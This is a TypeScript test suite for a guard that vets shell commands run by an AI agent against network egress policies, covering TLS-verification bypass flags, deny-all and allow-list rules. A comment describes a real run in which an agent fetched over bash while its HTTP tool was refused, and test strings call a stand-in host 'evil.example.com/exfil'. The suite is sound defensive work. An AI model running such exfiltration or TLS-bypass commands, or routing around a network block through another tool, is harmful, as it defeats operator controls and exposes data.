import { describe, it, expect } from 'vitest';
import { assertBashEgressAllowed, extractUrls, mentionsNetworkClient } from './bash-egress.js';
import { bashTool } from './bash.js';
import type { HostPolicyContext } from '../../core/network-guard.js';
import type { IAgent } from '../../types/index.js';

/**
 * The commands quoted here are REAL — lifted verbatim from the run that exposed
 * the gap (thread `fa3f2b23`, 2026-08-02), where 39 `bash` fetches ran while
 * `http_request` to the same class of target was being refused.
 */

const ctx = (
  networkPolicy: HostPolicyContext['networkPolicy'],
  hosts: string[] = [],
): HostPolicyContext => ({
  networkPolicy,
  allowedHosts: new Set(hosts),
  allowedWildcards: [],
  enforceHttps: false,
});

const OBSERVED_WGET =
  'wget --no-check-certificate -O /tmp/gh_response.json --header="Accept: application/vnd.github.v3+json" '
  + '"https://api.github.com/repos/lynox-ai/lynox/contents/packages?ref=main" 2>&1; cat /tmp/gh_response.json';

describe('assertBashEgressAllowed', () => {
  describe('allow-all (the default) is left alone', () => {
    for (const policy of [undefined, 'allow-all' as const]) {
      it(`permits an ordinary network command under ${String(policy)}`, () => {
        expect(() => assertBashEgressAllowed(
          'curl -s https://api.github.com/repos/lynox-ai/lynox', ctx(policy),
        )).not.toThrow();
      });

      it(`still permits a loopback IP under ${String(policy)} — a dev shell needs it`, () => {
        // Deliberate asymmetry with `http_request`, which refuses private IPs on
        // every policy. Routing bash through assertHostPolicy would inherit that
        // check and break `curl 127.0.0.1:3000`.
        //
        // The literal IP is the point. `localhost` is a NAME, and
        // `isPrivateIP` only inspects IP literals — so a `localhost` case here
        // passes with or without the early return and proves nothing. A
        // mutation that deletes the `allow-all` early return survives it and
        // dies on this one.
        expect(() => assertBashEgressAllowed(
          'curl -s http://127.0.0.1:3000/api/health', ctx(policy),
        )).not.toThrow();
        expect(() => assertBashEgressAllowed(
          'curl -s http://192.168.1.50:8080/status', ctx(policy),
        )).not.toThrow();
      });

      it(`permits a command with no network at all under ${String(policy)}`, () => {
        expect(() => assertBashEgressAllowed('ls -la && grep -n foo bar.txt', ctx(policy)))
          .not.toThrow();
      });
    }
  });

  describe('TLS verification cannot be turned off — on ANY policy', () => {
    // The one deliberate exception to "the default is untouched": allow-all says
    // which hosts are reachable, not that verification may be skipped.
    it('refuses the exact wget the observed run used', () => {
      expect(() => assertBashEgressAllowed(OBSERVED_WGET, ctx('allow-all')))
        .toThrow(/--no-check-certificate/);
    });

    for (const [label, cmd] of [
      ['curl --insecure', 'curl --insecure https://example.com'],
      ['curl -k', 'curl -k https://example.com'],
      ['node env var', 'NODE_TLS_REJECT_UNAUTHORIZED=0 node fetch.js'],
      ['git env var', 'GIT_SSL_NO_VERIFY=1 git clone https://example.com/x.git'],
    ] as const) {
      it(`refuses ${label} even under allow-all`, () => {
        expect(() => assertBashEgressAllowed(cmd, ctx('allow-all'))).toThrow(/TLS/);
      });
    }

    it('does not fire on a filename that merely contains a flag-like substring', () => {
      expect(() => assertBashEgressAllowed('cat notes-k.txt', ctx('allow-all'))).not.toThrow();
      expect(() => assertBashEgressAllowed('grep -rn insecure ./src', ctx('allow-all')))
        .not.toThrow();
    });

    // `-k` is a TLS flag TO CURL and an ordinary flag to half of coreutils.
    // Because the TLS check runs under every policy, an unscoped pattern would
    // refuse these on a default instance — the first version of this file did
    // exactly that, and a delta round on the fix caught it.
    for (const cmd of [
      'du -k /tmp',
      'df -k',
      'sort -k 2 file.txt',
      'tar -k -xf archive.tar',
      'ls -k',
      'du -k . | sort -rn | head',
    ]) {
      it(`leaves \`${cmd}\` alone — -k is only a TLS flag to curl`, () => {
        expect(() => assertBashEgressAllowed(cmd, ctx('allow-all'))).not.toThrow();
        expect(() => assertBashEgressAllowed(cmd, ctx('deny-all'))).not.toThrow();
      });
    }

    it('still refuses -k when curl IS the command', () => {
      expect(() => assertBashEgressAllowed('curl -k https://example.com', ctx('allow-all')))
        .toThrow(/TLS/);
      expect(() => assertBashEgressAllowed('echo x && curl -k https://example.com', ctx('allow-all')))
        .toThrow(/TLS/);
    });

    it('does not refuse --insecure without curl either', () => {
      expect(() => assertBashEgressAllowed('grep --insecure-mode ./log', ctx('allow-all')))
        .not.toThrow();
    });
  });

  describe('deny-all is an absolute promise', () => {
    it('refuses a network client even with no literal URL in the command', () => {
      // The loop over extracted URLs cannot cover this — that is the whole
      // reason for the client catch-all.
      expect(() => assertBashEgressAllowed('curl example.com', ctx('deny-all')))
        .toThrow(/air-gapped/);
      expect(() => assertBashEgressAllowed('wget "$TARGET_URL"', ctx('deny-all')))
        .toThrow(/air-gapped/);
    });

    it('refuses a client hidden after a pipe or a && chain', () => {
      expect(() => assertBashEgressAllowed('echo hi && curl example.com', ctx('deny-all')))
        .toThrow(/air-gapped/);
      expect(() => assertBashEgressAllowed('cat urls.txt | wget -i -', ctx('deny-all')))
        .toThrow(/air-gapped/);
    });

    it('leaves a purely local command alone', () => {
      expect(() => assertBashEgressAllowed('ls -la /tmp && wc -l file.txt', ctx('deny-all')))
        .not.toThrow();
    });

    it('does not trip on a filename containing a client name', () => {
      expect(() => assertBashEgressAllowed('cat my-curl-notes.txt', ctx('deny-all')))
        .not.toThrow();
      expect(() => assertBashEgressAllowed('rm ./sshkeys.bak', ctx('deny-all'))).not.toThrow();
    });
  });

  describe('allow-list applies the same host gate http_request uses', () => {
    it('permits a host on the list', () => {
      expect(() => assertBashEgressAllowed(
        'curl -s https://api.github.com/repos/x/y', ctx('allow-list', ['api.github.com']),
      )).not.toThrow();
    });

    it('refuses a host that is not', () => {
      expect(() => assertBashEgressAllowed(
        'curl -s https://evil.example.com/exfil', ctx('allow-list', ['api.github.com']),
      )).toThrow(/not in network allow-list/);
    });

    it('refuses when ANY url in a multi-target command is off-list', () => {
      expect(() => assertBashEgressAllowed(
        'curl https://api.github.com/a && curl https://evil.example.com/b',
        ctx('allow-list', ['api.github.com']),
      )).toThrow(/evil\.example\.com/);
    });
  });

  describe('guarded treats a shell command as full-control', () => {
    it('refuses a non-baseline host', () => {
      // A shell command is arbitrary-target and credential-capable, so it must
      // NOT get the open 'discovery' surface that web_research gets.
      expect(() => assertBashEgressAllowed(
        'curl https://evil.example.com/x', ctx('guarded'),
      )).toThrow(/guarded egress policy/);
    });
  });

  describe('url extraction', () => {
    it('pulls the url out of the observed wget, quotes and redirects included', () => {
      expect(extractUrls(OBSERVED_WGET))
        .toEqual(['https://api.github.com/repos/lynox-ai/lynox/contents/packages?ref=main']);
    });

    it('stops at a pipe rather than swallowing the pipeline', () => {
      expect(extractUrls('curl -s https://example.com/a.json | head -100'))
        .toEqual(['https://example.com/a.json']);
    });

    it('finds every url in a chained command', () => {
      expect(extractUrls('curl https://a.example.com; wget https://b.example.com'))
        .toEqual(['https://a.example.com', 'https://b.example.com']);
    });

    it('returns nothing when there is no url', () => {
      expect(extractUrls('ls -la | grep http')).toEqual([]);
    });
  });

  /**
   * The tests above all call `assertBashEgressAllowed` directly, which proves
   * the policy logic and NOTHING about whether the tool uses it. A mutation that
   * deletes the call from `bashTool.handler` passed every one of them — the
   * "green tests over dead wiring" shape. These go through the real handler.
   */
  describe('wired into bashTool.handler', () => {
    const agentWith = (policy: HostPolicyContext['networkPolicy']): IAgent =>
      ({ toolContext: ctx(policy) } as unknown as IAgent);

    it('refuses a TLS-bypassing command through the tool, without executing it', async () => {
      // `touch` would create the file if the command ran; the marker's absence
      // is what proves the refusal happened BEFORE execSync.
      const marker = `/tmp/lynox-egress-wiring-${String(process.pid)}.marker`;
      await expect(bashTool.handler(
        { command: `touch ${marker} && curl -k https://example.com` },
        agentWith('allow-all'),
      )).rejects.toThrow(/TLS/);
      const { existsSync, rmSync } = await import('node:fs');
      expect(existsSync(marker)).toBe(false);
      if (existsSync(marker)) rmSync(marker);
    });

    it('refuses an off-list host through the tool under allow-list', async () => {
      await expect(bashTool.handler(
        { command: 'curl -s https://evil.example.com/exfil' },
        ({ toolContext: ctx('allow-list', ['api.github.com']) } as unknown as IAgent),
      )).rejects.toThrow(/not in network allow-list/);
    });

    it('still runs an ordinary local command through the tool', async () => {
      const result = await bashTool.handler(
        { command: 'echo wired' }, agentWith('allow-all'),
      );
      expect(result).toContain('wired');
    });
  });

  describe('mentionsNetworkClient', () => {
    it('matches at a command position only', () => {
      expect(mentionsNetworkClient('curl example.com')).toBe(true);
      expect(mentionsNetworkClient('sudo wget x')).toBe(true);
      expect(mentionsNetworkClient('FOO=1 curl x')).toBe(true);
      expect(mentionsNetworkClient('cat curl-notes.txt')).toBe(false);
      expect(mentionsNetworkClient('echo "no client here"')).toBe(false);
    });
  });
});
